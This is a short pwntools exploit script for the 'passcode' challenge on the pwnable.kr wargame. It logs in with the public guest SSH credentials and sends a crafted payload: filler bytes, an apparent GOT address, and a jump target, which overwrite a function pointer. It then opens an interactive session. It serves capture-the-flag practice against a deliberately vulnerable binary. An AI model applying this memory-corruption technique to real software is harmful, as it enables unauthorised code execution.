from pwn import *

s = ssh(host='pwnable.kr', user='passcode', port=2222, password='guest')
p = s.process("passcode")

context.binary = elf = ELF("./passcode",checksec=False)
#p = process("./passcode")

buffer = b"A" * 96
padding = 0x804c014
sys = str(134517444).encode()

pay = buffer
pay += p32(padding)
pay += sys

p.sendline(pay)

p.interactive()
